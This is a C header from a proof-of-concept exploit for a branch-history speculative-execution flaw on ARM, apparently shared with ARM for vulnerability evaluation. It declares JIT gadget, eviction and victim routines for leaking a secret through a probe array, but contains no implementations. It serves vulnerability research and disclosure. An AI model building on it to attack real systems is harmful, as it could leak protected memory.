/*
 * PoC Codes for Branch History Speculative Update Exploitation
 * 
 * Sunday, November 3rd 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <stdint.h>
#ifndef __JIT_SNIPPETS_H__
#define __JIT_SNIPPETS_H__
#define JIT_SNIPPET_LENGTH(x) (uint64_t)&__##x##_end - (uint64_t)&x
#define JIT_SNIPPET_ALIGN_OFFSET(x) (uint64_t)&__##x##_align - (uint64_t)&x
#define JIT_SNIPPET_SYMBOLS(x, ...)     \
    extern void  x(__VA_ARGS__);        \
    extern void  __##x##_align(void);   \
    extern void  __##x##_end(void);

// JIT snippets since 2024/02

extern void jit_ccntr_pre_br(void);
extern void jit_ccntr_post_br(void);
extern void jit_ib_gadget(register void (**func_ptr)());
extern void jit_spec_mark_VFP(void);
extern void jit_spec_mark_ASE(void);
extern void jit_ret(void);
extern void jit_nop(void);

// JIT snippets since 2024/04

typedef void (*jit_general_3args_t)(uint64_t, uint64_t, uint64_t);
typedef void (*jit_general_4args_t)(uint64_t, uint64_t, uint64_t, uint64_t);
typedef void (*jit_populate_bhb_3args_t)(void*, uint32_t*, uint64_t);
typedef void (*jit_populate_bhb_4args_t)(void*, uint32_t*, uint64_t, uint64_t);

JIT_SNIPPET_SYMBOLS(jit_populate_bhb, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3);

typedef void (*jit_bst_entry_blr_t)(void*);
JIT_SNIPPET_SYMBOLS(jit_bst_entry_blr, register void (*func_ptr)());

typedef void (*jit_bst_evict_bcond_t)(uint64_t, uint64_t);
JIT_SNIPPET_SYMBOLS(jit_bst_evict_bcond, uint64_t secret, uint64_t bit);

typedef void (*jit_bse_victim_t)(void*, uint32_t*, void*, void*, uint8_t*);
JIT_SNIPPET_SYMBOLS(jit_bse_victim, void* ret_mem, uint32_t* offset, void* target, void *probe_base, uint8_t *secret_ptr);

#endif